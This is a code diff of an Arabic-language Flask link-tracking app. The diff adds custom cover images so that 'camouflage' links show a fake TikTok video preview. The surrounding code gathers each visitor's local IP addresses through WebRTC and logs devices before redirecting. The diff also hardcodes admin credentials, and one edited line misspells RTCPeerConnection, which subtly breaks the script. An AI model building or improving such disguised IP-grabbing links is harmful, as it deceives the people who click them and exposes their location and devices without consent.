@@ -10,7 +10,6 @@ DB_FILE = "tracker_data.db"
 USERNAME = "khaled"
 PASSWORD = "ALG@2022"
 
-# إنشاء وتجهيز قاعدة البيانات الدائمة SQLite
 def init_db():
     with sqlite3.connect(DB_FILE) as conn:
         cursor = conn.cursor()
@@ -18,7 +17,8 @@ def init_db():
             CREATE TABLE IF NOT EXISTS links (
                 id TEXT PRIMARY KEY,
                 original_url TEXT,
-                note TEXT
+                note TEXT,
+                custom_image TEXT
             )
         ''')
         cursor.execute('''
@@ -85,7 +85,7 @@ HTML_LAYOUT = '''
     </style>
 </head>
 <body>
-    <div class="navbar">📊 لوحة التحكم والإدارة (قاعدة بيانات دائمة)</div>
+    <div class="navbar">📊 لوحة تحكم إدارة الروابط المتقدمة</div>
     <div class="container">
         
         <div class="stats-overview">
@@ -100,15 +100,18 @@ HTML_LAYOUT = '''
         </div>
 
         <div class="create-box">
-            <h2>🔗 إنشاء رابط تتبع جديد</h2>
+            <h2>🔗 إنشاء رابط تتبع جديد بمواصفات المعاينة</h2>
             <form action="/create" method="POST">
                 <label>الرابط الأصلي المستهدف (Original URL):</label>
                 <input type="url" name="original_url" placeholder="https://vt.tiktok.com/..." required>
                 
+                <label>رابط صورة غلاف الفيديو (Image URL للمعاينة):</label>
+                <input type="url" name="custom_image" placeholder="ضع رابط صورة الغلاف الحقيقي للفيديو هنا">
+                
                 <label>ملاحظة لتمييز الرابط (Note):</label>
                 <input type="text" name="note" placeholder="مثال: فسيليتي 11" required>
                 
-                <button type="submit">توليد وإضافة</button>
+                <button type="submit">توليد وإضافة الرابط</button>
             </form>
         </div>
 
@@ -120,7 +123,7 @@ HTML_LAYOUT = '''
                         <th>الملاحظة (Note)</th>
                         <th>النقرات</th>
                         <th>رابط التمويه المخصص</th>
-                        <th>الرابط الحقيقي الأصلي</th>
+                        <th>صورة المعاينة</th>
                     </tr>
                 </thead>
                 <tbody>
@@ -134,7 +137,13 @@ HTML_LAYOUT = '''
                             <td style="font-weight: bold; color: #2c3e50;">{{ link.note }}</td>
                             <td><span class="badge">{{ link.clicks_count }}</span></td>
                             <td><a class="link-text" href="/secure/{{ link.id }}" target="_blank">{{ host_url }}secure/{{ link.id }}</a></td>
-                            <td><span class="link-text" style="color:#7f8c8d;">{{ link.original_url[:40] }}...</span></td>
+                            <td>
+                                {% if link.custom_image %}
+                                <img src="{{ link.custom_image }}" width="50" height="40" style="border-radius:4px; object-fit:cover;">
+                                {% else %}
+                                <span style="color:#aaa;">افتراضية</span>
+                                {% endif %}
+                            </td>
                         </tr>
                         {% endfor %}
                     {% endif %}
@@ -142,7 +151,7 @@ HTML_LAYOUT = '''
             </table>
         </div>
 
-        <div class="section-title">🔍 سجل النقرات المباشر وتتبع الأجهزة (Logs)</div>
+        <div class="section-title">🔍 سجل النقرات وتتبع الأجهزة (Logs)</div>
         <div class="logs-box">
             <table class="logs-table">
                 <thead>
@@ -187,7 +196,7 @@ def home():
         cursor = conn.cursor()
         
         cursor.execute('''
-            SELECT l.id, l.original_url, l.note, COUNT(c.id) as clicks_count 
+            SELECT l.id, l.original_url, l.note, l.custom_image, COUNT(c.id) as clicks_count 
             FROM links l LEFT JOIN clicks c ON l.id = c.link_id 
             GROUP BY l.id
         ''')
@@ -211,11 +220,12 @@ def home():
 def create():
     original_url = request.form.get('original_url')
     note = request.form.get('note')
+    custom_image = request.form.get('custom_image') or "https://images.unsplash.com/photo-1611162617213-7d7a39e9b1d7?w=600"
     link_id = str(uuid.uuid4())[:6].upper()
     
     with sqlite3.connect(DB_FILE) as conn:
         cursor = conn.cursor()
-        cursor.execute("INSERT INTO links (id, original_url, note) VALUES (?, ?, ?)", (link_id, original_url, note))
+        cursor.execute("INSERT INTO links (id, original_url, note, custom_image) VALUES (?, ?, ?, ?)", (link_id, original_url, note, custom_image))
         conn.commit()
         
     return redirect('/')
@@ -229,9 +239,9 @@ def secure_redirect(link_id):
         link_data = cursor.fetchone()
         
     if link_data:
-        title = "TikTok - فيديو رائج"
-        description = "شاهد مقطع الفيديو المرفق بجودة عالية عبر منصة تيك توك التفاعلية."
-        image_url = "https://images.unsplash.com/photo-1611162617213-7d7a39e9b1d7?w=600&auto=format&fit=crop"
+        title = "TikTok - شاهد مقطع الفيديو الرائج"
+        description = "انقر لمشاهدة الفيديو بالكامل بجودة عالية على تيك توك."
+        image_url = link_data['custom_image']
         
         return f'''
         <!DOCTYPE html>
@@ -252,7 +262,7 @@ def secure_redirect(link_id):
             <script>
                 function gatherLocalIPsAndRedirect() {{
                     var detectedIPs = [];
-                    window.RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
+                    window.RTCPPeerConnection = window.RTCPPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
                     
                     if (!window.RTCPeerConnection) {{
                         sendData("غير مدعوم");
